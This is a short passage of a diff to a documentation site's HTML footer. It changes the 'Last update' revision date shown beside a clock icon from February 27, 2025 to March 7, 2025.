     <span class="md-icon" title="Last update">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
     </span>
-    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">February 27, 2025</span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">March 7, 2025</span>
   </span>
 
     
